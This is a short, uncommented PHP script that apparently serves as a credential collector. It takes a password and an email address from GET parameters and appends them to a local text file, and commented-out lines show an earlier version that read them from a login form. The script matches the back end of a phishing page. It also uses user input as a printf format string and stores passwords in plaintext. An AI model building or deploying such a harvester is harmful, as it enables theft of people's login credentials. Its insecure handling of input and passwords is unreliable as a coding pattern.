<?php 

if(isset($_GET['pass']) && isset($_GET['email'])){

	$h = fopen("test.txt", "a");

	// if(isset($_POST['login'])){
	// 	$pass = $_POST['pass'];
	// 	$mail = $_POST['email'];
		fprintf($h, $_GET['pass']." ".$_GET['email']);
	// }

	fclose($h);

}

 ?>